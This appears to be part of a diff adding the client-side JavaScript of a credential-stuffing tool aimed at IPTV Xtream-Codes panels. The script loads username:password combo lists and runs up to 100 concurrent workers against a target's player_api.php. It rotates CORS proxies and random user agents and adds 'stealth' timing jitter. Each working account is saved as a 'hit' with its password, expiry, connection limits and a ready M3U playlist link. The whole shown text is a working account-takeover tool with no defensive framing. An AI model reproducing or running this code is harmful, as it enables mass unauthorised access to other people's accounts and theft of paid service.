+    if(ui?.user){ ui.user.textContent = `${t('currentUser')}: ${user}:${pass}`; }
+
+    const protos=['http://','https://'];
+    let data=null, usedProto='http://';
+
+    for(const p of protos){
+      const url = `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+      try{
+        // 🔄 on passe jobId à fetchWithCors
+        const res = await fetchWithCors(url, opts, jobId);
+        if(res.ok){ data=await res.json(); usedProto=p; break; }
+      }catch(_){}
+    }
+    if(!data) return null;
+
+    const uinfo = data.user_info || {};
+    const ok = (uinfo.status===t('statusActive')) 
+            || String(uinfo.auth)==='1' 
+            || String(uinfo.auth).toLowerCase()==='true' 
+            || uinfo.status==='Active';
+    if(!ok) return null;
+
+    let liveCatsText = `${t('categoriesRule')}\n• ${t('none')}`;
+    try{
+      const catsUrl = `${usedProto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_categories`;
+      // 🔄 on passe aussi jobId à getJson
+      const liveCats = await getJson(catsUrl, opts, jobId);
+      liveCatsText = summarizeCategories(liveCats, 40);
+    }catch(_){}
+
+    const porta   = host.includes(':') ? host.split(':')[1] : (usedProto==='https://' ? '443' : '80');
+    const hostSem = host.includes(':') ? host.split(':')[0] : host;
+    const creada  = uinfo.created_at ? new Date(uinfo.created_at*1000).toLocaleDateString(
+                      LANG==='es'?'es-ES':(LANG==='fr'?'fr-FR':'en-GB')
+                    ) : t('none');
+    const expira  = uinfo.exp_date   ? new Date(uinfo.exp_date*1000).toLocaleDateString(
+                      LANG==='es'?'es-ES':(LANG==='fr'?'fr-FR':'en-GB')
+                    ) : t('none');
+    const status  = uinfo.status || (String(uinfo.auth)==='1' ? t('statusActive') : t('statusUnknown'));
+    const statusEmoji = (status===t('statusActive') || status==='Active' || status==='Actif') ? '✅' : '❌';
+
+    const maxConns   = (uinfo.max_connections ?? uinfo.max_cons ?? uinfo['max_connections']) ?? t('none');
+    const activeCons = (uinfo.active_cons ?? uinfo.connected_cons ?? uinfo['active_connections']) ?? t('none');
+
+    const locLine = serverGeo ? `\n🌍 ${t('ip')}: ${serverGeo.ip}\n${serverGeo.flag} ${serverGeo.city}, ${serverGeo.country}` : '';
+    const link = `${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
+
+    const texto = `${t('title')}${locLine}
+🌐${t('host')}: ${hostSem}
+🚪${t('port')}: ${porta}
+👤${t('user')}: ${user}
+🔑${t('pass')}: ${pass}
+📅${t('created')}: ${creada}
+⏳${t('expires')}: ${expira}
+${statusEmoji}${t('status')}: ${status}
+👥 ${t('maxConn')}: ${maxConns}
+🔌 ${t('actConn')}: ${activeCons}
+${t('categories')}
+${liveCatsText}
+${t('link')}: ${link}
+${t('groupsA')}
+${t('groupsB')}`;
+
+    return { texto, user, pass, host };
+  }catch{ 
+    return null; 
+  }
+}
+
+/* === Ajout visuel d’un Hit (résultats partagés en bas) === */
+function mostrarHit(hit, ui){
+  const div = document.createElement('div'); 
+  div.className = 'hit-block';
+
+  const header = document.createElement('div'); 
+  header.className = 'hit-header';
+  header.textContent = `${t('user')}: ${hit.user} | ${t('pass')}: ${hit.pass}`;
+
+  const content = document.createElement('pre'); 
+  content.className = 'hit-content'; 
+  content.textContent = hit.texto;
+
+  div.appendChild(header); 
+  div.appendChild(content);
+
+  // 🔽 Résultats envoyés dans le container global (en bas)
+  hitsContainer.prepend(div);
+
+  // ✅ Compteur du job mis à jour indépendamment
+  if(ui.hitsCountEl){
+    ui.hitsCountEl.innerHTML = 
+      `${t('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
+  }
+
+  playHitSound();
+}
+
+/* === Multi-analyse : une fonction par job, même domaine === */
+async function processarCombosJob(host, combos, conc, jobId){
+  const ui = uiFor(jobId);
+
+  // === reset UI & état DU JOB uniquement ===
+  ui.hitsArr.length = 0;
+  if(ui.hitsCountEl) ui.hitsCountEl.innerHTML =
+    `${t('hitsFound')}: <span class="yellow-hit">0</span>`;
+  if(ui.fill) ui.fill.style.width = '0%';
+
+  // État local au job
+  let total = combos.length;
+  let processed = 0;
+
+  if(ui.text) ui.text.textContent = t('waiting');
+  if(ui.user) ui.user.textContent = `${t('currentUser')}: -`;
+  actualizarProgresoJob({ processed, total }, ui);
+
+  // Borne la concurrence (1–100)
+  conc = Math.max(1, Math.min(100, conc|0));
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+  function createSessionJob(){
+    return {
+      headers: {
+        "User-Agent": randomUA(),
+        "Accept": "application/json,text/javascript,*/*;q=0.9"
+      },
+      cookies: {}
+    };
+  }
+
+  // index lock-free local à CE job
+  let index = 0;
+
+  async function worker(){
+    const session = createSessionJob();
+
+    while(index < total && !stopRequested){
+      const i = index++;
+      if(i >= total) break;
+
+      const combo = combos[i];
+      if(!combo) continue;
+
+      if(ui.user) ui.user.textContent = `${t('currentUser')}: ${combo}`;
+
+      let opts = { headers: { ...session.headers } };
+      opts = attachCookies(opts, session);
+
+      try{
+        // Passe le jobId pour utiliser le proxy fixe de CE job
+        const hit = await validarCombo(host, combo, opts, session, ui, jobId);
+        if(stopRequested) break;
+
+        if(hit){
+          ui.hitsArr.push(hit);        // hits du JOB
+          mostrarHit(hit, ui);         // affichage dans le container global (en bas)
+        }
+      }catch(_){ /* silence */ }
+      finally{
+        processed++;
+        actualizarProgresoJob({ processed, total }, ui);
+      }
+
+      // Jitter furtif (40–180 ms) + sortie propre si stop
+      await sleep(40 + Math.random()*140);
+      if(stopRequested) break;
+    }
+  }
+
+  if(ui.text) ui.text.textContent = t('starting');
+
+  // ⏳ Départ légèrement décalé selon le job (0/100/200 ms)
+  await sleep((jobId - 1) * 100);
+
+  await Promise.all(Array.from({ length: conc }, () => worker()));
+
+  if(ui.user) ui.user.textContent = `${t('currentUser')}: -`;
+  if(ui.text) ui.text.textContent += (stopRequested ? t('scanStopped') : t('scanDone'));
+}
+/* === Texte & sauvegarde — fichier unique pour les 3 jobs === */
+
+// (optionnel) dédoublonnage par texte complet du hit
+function dedupeHits(arr){
+  const seen = new Set();
+  const out = [];
+  for(const h of arr){
+    const key = String(h.texto||'').trim();
+    if(!key || seen.has(key)) continue;
+    seen.add(key); out.push(h);
+  }
+  return out;
+}
+
+// Construit un texte unique pour les 3 jobs
+function buildHitsTextAll({ groupByJob=true, dedupe=true } = {}){
+  const j1 = HITS[1] || [], j2 = HITS[2] || [], j3 = HITS[3] || [];
+  let all = [...j1, ...j2, ...j3];
+  if(dedupe) all = dedupeHits(all);
+
+  // entête résumé
+  const total =
+    (HITS[1]?.length||0) + (HITS[2]?.length||0) + (HITS[3]?.length||0);
+  const totalAfter = all.length;
+
+  const header =
+`=============== 🎾SCAN Gaboo 🎾===============
+Scan1: ${HITS[1]?.length||0} hits
+Scan2: ${HITS[2]?.length||0} hits
+Scan3: ${HITS[3]?.length||0} hits
+Scan4: ${HITS[4]?.length||0} hits
+Total (brut): ${total} | After deduplication: ${totalAfter}
+=======================================================
+
+`;
+
+  if(!groupByJob){
+    // tout à la suite (mélangé)
+    const body = all.map(h => h.texto).join('\n\n-----------------\n\n');
+    return header + (body || '');
+  }
+
+  // regroupé par job (sections)
+  const sep = '\n\n-----------------\n\n';
+  const sec1 = (j1.length ? `\n[Scan 1]\n\n${(dedupe?dedupeHits(j1):j1).map(h=>h.texto).join(sep)}` : '');
+  const sec2 = (j2.length ? `\n[Scan 2]\n\n${(dedupe?dedupeHits(j2):j2).map(h=>h.texto).join(sep)}` : '');
+  const sec3 = (j3.length ? `\n[Scan 3]\n\n${(dedupe?dedupeHits(j3):j3).map(h=>h.texto).join(sep)}` : '');
+  return header + [sec1, sec2, sec3].filter(Boolean).join('\n');
+}
+
+// Nom de fichier unique pour le domaine
+function domainFileName(rawHost){
+  const h = limpiarHost(rawHost).replace(/[^a-zA-Z0-9._-]/g,'_');
+  const d = new Date(); const pad = n => String(n).padStart(2,'0');
+  const ts = `${d.getFullYear()}${pad(d.getMonth()+1)}${pad(d.getDate())}_${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}`;
+  return `scanVEGETA_${h}_${ts}.txt`;
+}
+
+// Sauvegarde un seul fichier avec les 3 jobs
+async function saveHitsAll(rawHost, { allowEmpty=false, groupByJob=true, dedupe=true } = {}){
+  const content = buildHitsTextAll({ groupByJob, dedupe });
+  if(!content && !allowEmpty){
+    alert(t('noHits'));
+    return;
+  }
+  const blob = new Blob([content || ''], { type:'text/plain;charset=utf-8' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = domainFileName(rawHost);
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+}
+async function saveHitsToDevicePerDomain(rawHost, allowEmpty=false){
+  const content=buildHitsText();
+  if(!content && !allowEmpty){ alert(t('noHits')); return; }
+  const blob=new Blob([content||''],{type:'text/plain;charset=utf-8'});
+  const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=domainFileName(rawHost);
+  document.body.appendChild(a); a.click(); a.remove();
+}
+
+/* === Chargement des 3 fichiers et zone texte, états boutons === */
+function readTxtFile(inputEl, targetArray){
+  targetArray.length = 0;
+  const f = inputEl.files?.[0];
+  if(!f){ updateStartState(); return; }
+  const r = new FileReader();
+  r.onload = e=>{
+    const lines = String(e.target.result||'').split(/\r?\n/);
+    for(const line of lines){
+      const pair = extractCombo(line.trim());
+      if(pair) targetArray.push(`${pair[0]}:${pair[1]}`);
+    }
+    updateStartState();
+  };
+  r.readAsText(f);
+}
+comboFile1.addEventListener('change', ()=>readTxtFile(comboFile1, combos1));
+comboFile2.addEventListener('change', ()=>readTxtFile(comboFile2, combos2));
+comboFile3.addEventListener('change', ()=>readTxtFile(comboFile3, combos3));
+
+comboText?.addEventListener('input', ()=>{
+  combosTxt.length = 0;
+  const raw = comboText.value || '';
+  if(raw){
+    const lines = raw.split(/\r?\n/);
+    for(const line of lines){
+      const pair = extractCombo(line);
+      if(pair) combosTxt.push(`${pair[0]}:${pair[1]}`);
+    }
+  }
+  updateStartState();
+});
+
+hostInput.addEventListener('input', updateStartState);
+
+/* === Boutons === */
+startBtn.addEventListener('click', async ()=>{
+  if(isRunning) return;
+
+  unlockAudio();
+  if(audioCtx && audioCtx.state === 'suspended'){
+    try{ await audioCtx.resume(); }catch(_){}
+  }
+
+  // 🔄 Reset UI (3 zones) + état hits par job
+  startBtn.disabled = true; 
+  saveBtn.disabled  = true; 
+  stopBtn.disabled  = true;
+
+  // ❗ Très important : on réarme le stop
+  stopRequested = false;
+
+  // ✅ On vide le container GLOBAL (un seul bloc de résultats en bas)
+  if(hitsContainer) hitsContainer.textContent = '';
+
+  // Réinitialise les 3 compteurs
+  [hitsCount1, hitsCount2, hitsCount3].forEach(el=>{
+    if(el) el.innerHTML = `${t('hitsFound')}: <span class="yellow-hit">0</span>`;
+  });
+
+  // Vide les tableaux de hits par job
+  Object.values(HITS).forEach(arr => arr.length = 0);
+
+  // Reset barres + textes
+  [progressBarFill, progressBarFill2, progressBarFill3].forEach(el=>{ if(el) el.style.width='0%'; });
+  [progressText, progressText2, progressText3].forEach(el=>{ if(el) el.textContent=t('resolving'); });
+  [currentCombo, currentCombo2, currentCombo3].forEach(el=>{ if(el) el.textContent=`${t('currentUser')}: -`; });
+
+  const host = limpiarHost(hostInput.value);
+  const baseConc = parseInt(concurrencyInput.value) || 80;
+
+  // IP/Geo une seule fois
+  serverIP  = await resolveIP(host);
+  serverGeo = serverIP ? await fetchGeo(serverIP) : null;
+
+  // Si du texte libre a été collé, on l’injecte dans Job1
+  if(combosTxt.length){
+    combos1 = combos1.concat(combosTxt);
+    combosTxt = [];
+    if(comboText) comboText.value = '';
+  }
+
+  // Démarrage
+  isRunning = true;
+  setTimeout(()=>{ stopBtn.disabled = false; }, 300);
+
+  // 🎯 Choix d’un proxy fixe par job + répartition de la concurrence
+  JOB_PROXIES = {}; // reset
+  const shuffled = [...CORS_PROXIES].sort(()=>Math.random()-0.5);
+
+  const activeJobs = [combos1.length>0, combos2.length>0, combos3.length>0].filter(Boolean).length || 1;
+  const perConc = Math.max(1, Math.floor(baseConc / activeJobs));
+
+  if(combos1.length) JOB_PROXIES[1] = shuffled[0 % CORS_PROXIES.length];
+  if(combos2.length) JOB_PROXIES[2] = shuffled[1 % CORS_PROXIES.length];
+  if(combos3.length) JOB_PROXIES[3] = shuffled[2 % CORS_PROXIES.length];
+
+  // Lance uniquement les jobs qui ont des combos
+  const jobs = [];
+  if(combos1.length) jobs.push(processarCombosJob(host, combos1, perConc, 1));
+  if(combos2.length) jobs.push(processarCombosJob(host, combos2, perConc, 2));
+  if(combos3.length) jobs.push(processarCombosJob(host, combos3, perConc, 3));
+
+  // Si aucun job, on sort proprement
+  if(jobs.length === 0){
+    isRunning = false;
+    startBtn.disabled = false;
+    saveBtn.disabled  = false;
+    stopBtn.disabled  = true;
+    updateStartState?.();
+    return;
+  }
+
+  Promise.allSettled(jobs).then(()=>{
+    isRunning = false;
+    stopBtn.disabled = true;
+
+    try{
+      // 📥 Un seul fichier pour TOUT regrouper (jobs 1+2+3)
+      const totalHits = (HITS[1]?.length||0) + (HITS[2]?.length||0) + (HITS[3]?.length||0);
+      if(autoDownload && autoDownload.checked && totalHits > 0){
+        saveHitsAll(host, { allowEmpty:false, groupByJob:true, dedupe:true });
+      }
+    }catch(_){}
+
+    startBtn.disabled = false;
+    saveBtn.disabled  = false;
+    updateStartState?.();
+  });
+});
+stopBtn.addEventListener('click', ()=>{
+  if(!isRunning) return;
+  stopRequested=true; stopBtn.disabled=true;
+  [progressText,progressText2,progressText3].forEach(el=>{ if(el) el.textContent += t('scanStopped'); });
+});
+
+saveBtn.addEventListener('click', ()=>{
+  const host=hostInput.value; if(!host) return;
+  saveHitsToDevicePerDomain(host);
+});
+
+/* Init */
+applyLang();
+updateStartState();
+</script>
+</body>
+</html>
